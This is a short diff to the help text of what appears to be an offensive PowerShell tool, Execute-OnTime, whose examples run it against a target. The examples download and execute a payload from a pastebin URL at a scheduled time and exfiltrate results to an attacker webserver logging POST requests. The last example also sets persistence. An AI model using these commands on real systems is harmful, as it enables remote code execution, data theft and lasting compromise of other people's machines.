@@ -59,11 +59,12 @@ Usually, you should let the Name Server of target to resolve things for you.
 
 .EXAMPLE
 PS > Execute-OnTime -PayloadURL http://pastebin.com/raw.php?i=Zhyf8rwh -Arguments Get-Information -Time hh:mm -CheckURL http://pastebin.com/raw.php?i=Zhyf8rwh -StopString stoppayload
+Use above when using the payload from non-interactive shells.
 
 EXAMPLE
 PS > Execute-OnTime PayloadURL http://pastebin.com/raw.php?i=Zhyf8rwh -Arguments Get-Information -Time hh:mm -CheckURL http://pastebin.com/raw.php?i=Zhyf8rwh -StopString stoppayload -exfil -ExfilOption Webserver -URL http://192.168.254.183/catchpost.php
 
-Use above when using the payload from non-interactive shells.
+Exfiltrate results to a webserver which logs POST requests.
 
 .EXAMPLE
 PS > Execute-OnTime -PayloadURL http://example.com/script.ps1 -Time hh:mm -CheckURL http://pastebin.com/raw.php?i=Zhyf8rwh -StopString stoppayload -exfil -ExfilOption Webserver -URL http://192.168.254.183/catchpost.php -persist
